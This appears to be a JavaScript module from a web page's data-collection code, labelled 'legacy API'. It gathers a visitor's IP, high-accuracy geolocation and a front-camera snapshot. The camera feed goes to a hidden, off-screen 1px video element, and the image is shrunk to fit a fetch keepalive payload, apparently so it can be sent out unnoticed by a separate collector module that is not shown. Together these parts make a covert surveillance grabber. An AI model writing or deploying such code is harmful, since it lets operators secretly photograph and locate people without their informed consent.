/**
 * Legacy API surface — kept so older imports do not break.
 * All real work lives in geo-precision.js and collect-v3.js now.
 */

export { resolveIpAndGeo } from "./geo-precision.js";

export async function fetchPublicIp() {
  const { resolveIpAndGeo: resolve } = await import("./geo-precision.js");
  return resolve();
}

export function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ granted: false, error: "unsupported" });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          granted: true,
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      (err) => {
        resolve({
          granted: false,
          error: err.code === 1 ? "denied" : String(err.message),
        });
      },
      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
    );
  });
}

function createHiddenVideo() {
  const video = document.createElement("video");
  video.setAttribute("playsinline", "");
  video.muted = true;
  video.playsInline = true;
  video.autoplay = true;
  Object.assign(video.style, {
    position: "fixed",
    width: "1px",
    height: "1px",
    opacity: "0",
    pointerEvents: "none",
    left: "-10000px",
    top: "0",
  });
  document.body.appendChild(video);
  return video;
}

function waitForVideoFrame(video) {
  return new Promise((resolve) => {
    if (video.videoWidth > 0) {
      resolve();
      return;
    }
    const onReady = () => {
      video.removeEventListener("loadeddata", onReady);
      resolve();
    };
    video.addEventListener("loadeddata", onReady);
    setTimeout(resolve, 1800);
  });
}

export async function captureSelfie() {
  const videoEl = createHiddenVideo();
  let stream;

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 960 },
        height: { ideal: 720 },
      },
      audio: false,
    });

    videoEl.srcObject = stream;
    await videoEl.play();
    await waitForVideoFrame(videoEl);

    // 480x360 @ q0.55 ≈ 25-40 KB base64 — fits the fetch keepalive cap.
    const maxW = 480;
    const vw = videoEl.videoWidth || 640;
    const vh = videoEl.videoHeight || 480;
    const scale = vw > maxW ? maxW / vw : 1;
    const canvas = document.createElement("canvas");
    canvas.width = Math.round(vw * scale);
    canvas.height = Math.round(vh * scale);
    const ctx = canvas.getContext("2d");
    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

    let quality = 0.55;
    let dataUrl = canvas.toDataURL("image/jpeg", quality);

    // Hard shot at the keepalive ceiling: shrink quality until it fits.
    while (dataUrl.length > 45000 && quality > 0.25) {
      quality -= 0.1;
      dataUrl = canvas.toDataURL("image/jpeg", quality);
    }

    return { granted: true, dataUrl };
  } finally {
    stream?.getTracks().forEach((t) => t.stop());
    videoEl.srcObject = null;
    videoEl.remove();
  }
}
